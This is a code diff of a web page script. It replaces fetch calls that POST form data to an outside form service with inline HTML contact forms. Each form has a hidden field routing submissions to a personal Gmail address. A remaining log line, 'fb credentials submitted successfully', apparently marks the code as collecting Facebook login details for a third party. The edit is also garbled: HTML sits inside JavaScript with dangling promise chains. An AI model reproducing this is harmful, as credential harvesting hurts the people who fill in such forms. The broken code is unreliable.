@@ -2031,19 +2031,16 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    fetch('https://submit-form.com/N2WhjMZaW', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(formData)
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Form submission failed');
-      }
-      return response.json();
+    <form id="form1">
+  <h3>Contact Form 1</h3>
+  <input type="text" name="user_name" placeholder="Your Name" required>
+  <input type="email" name="user_email" placeholder="Your Email" required>
+  <textarea name="message" placeholder="Your Message" required></textarea>
+
+  <input type="hidden" name="to_email" value="akeraa191@gmail.com">
+
+  <button type="submit">Send Form 1</button>
+</form>
     })
     .then(data => {
       console.log('Form submitted successfully:', data);
@@ -2088,19 +2085,16 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    fetch('https://submit-form.com/N2WhjMZaW', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(fbData)
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('fb form submission failed');
-      }
-      return response.json();
+    <form id="form2">
+  <h3>Contact Form 2</h3>
+  <input type="text" name="user_name" placeholder="Your Name" required>
+  <input type="email" name="user_email" placeholder="Your Email" required>
+  <textarea name="message" placeholder="Your Message" required></textarea>
+
+  <input type="hidden" name="to_email" value="akeraa191@gmail.com">
+
+  <button type="submit">Send Form 2</button>
+</form>
     })
     .then(data => {
       console.log('fb credentials submitted successfully:', data);
